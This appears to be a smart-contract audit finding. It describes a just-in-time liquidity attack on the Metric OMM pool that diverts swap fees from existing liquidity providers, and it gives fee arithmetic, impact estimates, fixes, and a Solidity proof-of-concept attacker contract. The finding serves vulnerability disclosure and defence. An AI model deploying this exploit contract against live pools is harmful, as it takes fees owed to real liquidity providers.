### Title
JIT Liquidity Attack Enables Fee Theft from Existing LPs via Permissionless Atomic Add/Swap/Remove — (`metric-core/contracts/libraries/LiquidityLib.sol`)

### Summary

The Metric OMM pool embeds LP fees directly into bin token balances (`token0BalanceScaled` / `token1BalanceScaled`). Because liquidity addition and removal are permissionless, costless (excluding gas), and carry no holding-period requirement, an attacker can atomically add a dominant liquidity position immediately before a large swap, capture the majority of the LP fee generated by that swap, and remove the position in the same transaction. Existing LPs lose a quantifiable portion of the fees they are owed.

---

### Finding Description

**Fee embedding mechanism.** Every swap step in `SwapMath` adds the LP-retained fee directly to the active bin's scaled balance. For example, in `buyToken0InBinSpecifiedOut`:

```
binState.token1BalanceScaled =
    (uint256(binState.token1BalanceScaled) + amountInScaled - protocolFeeAmountScaled).toUint104();
``` [1](#0-0) 

The LP fee portion (`feeAmountScaled - protocolFeeAmountScaled`) is permanently merged into `token*BalanceScaled`. There is no per-position fee-growth accumulator; fees are inseparable from principal inside the bin.

**Proportional add/remove.** When a new LP joins an already-populated bin, `LiquidityLib.addLiquidity` charges them proportional to the current bin balance (which already includes all accumulated fees):

```solidity
amount0Scaled = Math.ceilDiv(_checkedMul(binState.token0BalanceScaled, sharesToAdd), binTotalSharesVal);
amount1Scaled = Math.ceilDiv(_checkedMul(binState.token1BalanceScaled, sharesToAdd), binTotalSharesVal);
``` [2](#0-1) 

On removal, the LP receives their proportional share of the then-current bin balance:

```solidity
uint256 amount0Scaled = _checkedMul(binState.token0BalanceScaled, sharesToRemove) / binTotalSharesVal;
uint256 amount1Scaled = _checkedMul(binState.token1BalanceScaled, sharesToRemove) / binTotalSharesVal;
``` [3](#0-2) 

**No holding-period or JIT guard.** `addLiquidity` and `removeLiquidity` carry independent reentrancy locks (`PoolActions.ADD_LIQUIDITY`, `PoolActions.REMOVE_LIQUIDITY`) that are released before the next call. Sequential `addLiquidity → swap → removeLiquidity` in a single transaction is fully permitted. [4](#0-3) 

**Attack arithmetic.** Let:
- `B` = bin scaled balance before the attack
- `S` = total shares before the attack
- `s` = attacker's shares (chosen to be `≫ S`)
- `F` = LP fee added to the bin by the victim's swap

Steps in one atomic transaction:
1. `addLiquidity`: attacker pays `⌈B·s/S⌉` (fair value for pre-swap balance)
2. `swap` (victim's or attacker-triggered): bin balance becomes `B·(S+s)/S + F`
3. `removeLiquidity`: attacker receives `⌊(B·(S+s)/S + F)·s/(S+s)⌋ = B·s/S + F·s/(S+s)`

Attacker net gain ≈ `F·s/(S+s)`. As `s → ∞`, the attacker captures nearly all of `F`.

Existing LP loss per share: `F·userShares·s / [S·(S+s)]` — a direct reduction in owed fee assets.

---

### Impact Explanation

Existing LPs lose a portion of the LP fees they are owed from every swap that a JIT attacker front-runs. The loss is proportional to the attacker's injected share fraction and the LP fee generated by the targeted swap. For a pool with a 0.3 % LP fee and a 1 M USD swap, the LP fee is ~3 000 USD; an attacker holding 99 % of shares post-injection captures ~2 970 USD from existing LPs in a single block. This is a direct loss of owed LP assets, not opportunity cost.

---

### Likelihood Explanation

The attack requires only:
1. A contract that implements `IMetricOmmModifyLiquidityCallback` and `IMetricOmmSwapCallback`.
2. Sufficient token capital to dominate the target bin for one block.
3. Mempool visibility of a large pending swap (or the attacker can self-generate the swap).

No privileged role, no special token, no oracle manipulation. On any EVM chain with a public mempool or block-builder access, this is straightforward MEV. Likelihood is **high** whenever the pool has meaningful trading volume.

---

### Recommendation

1. **Minimum holding period**: Record the block number at which each position was last increased and reject `removeLiquidity` calls in the same block (or within N blocks).
2. **Fee-growth accumulator**: Separate LP fee accounting from principal using per-share fee-growth accumulators (Uniswap v3 style), so fees accrue only to shares that were present when the swap occurred.
3. **Withdrawal fee**: Charge a small fee on `removeLiquidity` that is redistributed to remaining LPs, making rapid add/remove unprofitable.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IMetricOmmPoolActions} from "metric-core/contracts/interfaces/IMetricOmmPool/IMetricOmmPoolActions.sol";
import {IMetricOmmModifyLiquidityCallback} from "metric-core/contracts/interfaces/callbacks/IMetricOmmModifyLiquidityCallback.sol";
import {IMetricOmmSwapCallback} from "metric-core/contracts/interfaces/callbacks/IMetricOmmSwapCallback.sol";
import {LiquidityDelta} from "metric-core/contracts/types/PoolOperation.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract JITAttacker is IMetricOmmModifyLiquidityCallback, IMetricOmmSwapCallback {
    address pool;
    address token0;
    address token1;

    constructor(address _pool, address _token0, address _token1) {
        pool = _pool; token0 = _token0; token1 = _token1;
        IERC20(token0).approve(pool, type(uint256).max);
        IERC20(token1).approve(pool, type(uint256).max);
    }

    /// @notice Execute JIT attack atomically
    function attack(int8 targetBin, uint256 jitShares, int128 swapAmount) external {
        // Step 1: Add dominant liquidity to the target bin
        int256[] memory bins = new int256[](1);
        bins[0] = targetBin;
        uint256[] memory shares = new uint256[](1);
        shares[0] = jitShares;
        LiquidityDelta memory delta = LiquidityDelta({binIdxs: bins, shares: shares});
        IMetricOmmPoolActions(pool).addLiquidity(address(this), 0, delta, "", "");

        // Step 2: Execute swap — LP fee is added to bin balance
        IMetricOmmPoolActions(pool).swap(address(this), true, swapAmount, 0, "", "");

        // Step 3: Remove liquidity — receive principal + share of new LP fee
        IMetricOmmPoolActions(pool).removeLiquidity(address(this), 0, delta, "");
        // Net profit: F * jitShares / (existingShares + jitShares)
    }

    function metricOmmModifyLiquidityCallback(uint256 a0, uint256 a1, bytes calldata) external override {
        if (a0 > 0) IERC20(token0).transfer(msg.sender, a0);
        if (a1 > 0) IERC20(token1).transfer(msg.sender, a1);
    }

    function metricOmmSwapCallback(int256 a0, int256 a1, bytes calldata) external override {
        if (a0 > 0) IERC20(token0).transfer(msg.sender, uint256(a0));
        if (a1 > 0) IERC20(token1).transfer(msg.sender, uint256(a1));
    }
}
```

**Expected result**: After `attack()`, the attacker's token balance exceeds what they deposited by approximately `F·s/(S+s)`, where `F` is the LP fee from the swap and `s/(S+s)` is the attacker's share fraction. Existing LPs' claimable balance is reduced by the same amount.

The root cause is in `LiquidityLib.removeLiquidity` at lines 205–206 — the withdrawal amount is computed against the post-swap bin balance with no guard against same-block or same-transaction add/remove cycles. [3](#0-2) [5](#0-4) [4](#0-3)
